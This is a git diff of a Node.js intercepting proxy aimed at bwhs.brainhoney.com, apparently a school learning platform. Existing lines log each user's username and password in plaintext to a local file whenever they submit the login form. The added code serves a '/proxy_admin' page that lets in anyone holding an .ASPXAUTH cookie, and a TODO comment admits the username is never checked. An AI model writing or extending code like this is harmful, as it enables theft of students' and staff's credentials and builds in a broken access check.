@@ -5,12 +5,31 @@ var http = require('http'),
     upgrade = require(__dirname + '/upgrade.js'),
     logger = require(__dirname + '/log.js');
 
+var admin_server = function(req, res, parsed_req) {
+  var cookie = {};
+  (req.headers['cookie'] || '').split(';').forEach(function(pair) {
+    pair = pair.split('=');
+    cookie[pair[0]] = pair[1];
+  });
+  if( cookie['.ASPXAUTH'] ) {
+    // TODO: check username
+    res.write("Admin\n");
+    res.end();
+  } else {
+    res.writeHead(302, {
+      'Location': 'https://bwhs.brainhoney.com/Login.vp/page.htm?ReturnUrl=https%3A%2F%2Fbwhs.brainhoney.com%2Fproxy_admin'
+    });
+    res.end();
+  }
+};
 var filter = function(req, res, parsed_req, cont) {
   if( parsed_req.host == 'bwhs.brainhoney.com' ) {
     if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
       logger(req, './log.txt', function(body) {
 	return body.username+'    '+body.password;
       });
+    } else if( parsed_req.path.match(/^\/proxy_admin/) ) {
+      admin_server(req, res, parsed_req);
     }
     cont();
   } else {
